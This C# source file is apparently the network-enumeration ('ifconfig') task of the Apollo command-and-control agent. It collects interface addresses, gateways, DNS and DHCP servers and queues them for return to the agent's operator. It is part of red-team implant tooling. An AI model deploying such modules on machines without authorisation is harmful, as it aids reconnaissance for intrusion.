#define COMMAND_NAME_UPPER

#if DEBUG
#define IFCONFIG
#endif

#if IFCONFIG

using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.Collections.Generic;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.Serialization;

namespace Tasks
{
    [DataContract()]
    struct InterfaceConfiguration
    {
        [DataMember()]
        public string Description { get; set; }
        [DataMember()]
        public string AdapterName { get; set; }
        [DataMember()]
        public string AdapterId { get; set; }
        [DataMember()]
        public string Status { get; set; }
        [DataMember()]
        public List<string> AdressesV6 { get; set; }
        [DataMember()]
        public List<string> AdressesV4 { get; set; }
        [DataMember()]
        public List<string> DnsServers { get; set; }
        [DataMember()]
        public List<string> Gateways { get; set; }
        [DataMember()]
        public List<string> DhcpAddresses { get; set; }
        [DataMember()]
        public string DnsEnabled { get; set; }
        [DataMember()]
        public string DnsSuffix { get; set; }
        [DataMember()]
        public string DynamicDnsEnabled { get; set; }
    }
    
    public class ifconfig : Tasking
    {
        private List<InterfaceConfiguration> _interfaces = new List<InterfaceConfiguration>();
        
        public ifconfig(IAgent agent, MythicTask data) : base(agent, data)
        {
        }
        
        public override void Kill()
        {
            throw new NotImplementedException();
        }

        public override void Start()
        {
            NetworkInterface[] adapters = NetworkInterface.GetAllNetworkInterfaces();
            foreach (NetworkInterface adapter in adapters) {
                InterfaceConfiguration interfaceData = new InterfaceConfiguration {
                    Description = "",
                    AdapterName = "",
                    AdapterId = "",
                    Status = "",
                    DnsEnabled = "",
                    DnsSuffix = "",
                    DynamicDnsEnabled = "",
                    AdressesV4 = new List<string>(),
                    AdressesV6 = new List<string>(),
                    DhcpAddresses = new List<string>(),
                    DnsServers = new List<string>(),
                    Gateways = new List<string>()
                };
                                        
                // Interface Properties
                IPInterfaceProperties properties = adapter.GetIPProperties();
                interfaceData.Description = adapter.Description;
                interfaceData.AdapterName = adapter.Name;
                interfaceData.AdapterId = adapter.Id;
                interfaceData.Status = adapter.OperationalStatus.ToString();

                // IP address 
                UnicastIPAddressInformationCollection uniCast = properties.UnicastAddresses;
                if (uniCast.Count > 0) {
                    foreach (UnicastIPAddressInformation uni in uniCast) {
                        if (uni.Address.ToString().Contains(":"))
                            interfaceData.AdressesV6.Add(uni.Address.ToString());
                        else
                            interfaceData.AdressesV4.Add(uni.Address.ToString());
                    }
                }
                
                // Gateway 
                foreach (GatewayIPAddressInformation gateway in properties.GatewayAddresses)
                    interfaceData.Gateways.Add(gateway.Address.ToString());

                // DNS
                IPAddressCollection dnsServers = properties.DnsAddresses;
                if (dnsServers.Count > 0) {
                    foreach (IPAddress dns in dnsServers)
                        interfaceData.DnsServers.Add(dns.ToString());
                }
                
                if (properties.IsDnsEnabled) {
                    interfaceData.DnsSuffix = properties.DnsSuffix;
                    interfaceData.DnsEnabled = properties.IsDnsEnabled.ToString();
                    interfaceData.DynamicDnsEnabled = properties.IsDynamicDnsEnabled.ToString();
                }

                // DHCP 
                IPAddressCollection dhcp = properties.DhcpServerAddresses;
                if (dhcp.Count > 0) {
                    foreach (IPAddress address in dhcp) {
                        interfaceData.DhcpAddresses.Add(address.ToString());
                    }
                }
                
                _interfaces.Add(interfaceData);
                
            }

            _agent.GetTaskManager().AddTaskResponseToQueue(
                CreateTaskResponse(
                    _jsonSerializer.Serialize(_interfaces),
                    true,
                    ""));
        }
    }
}

#endif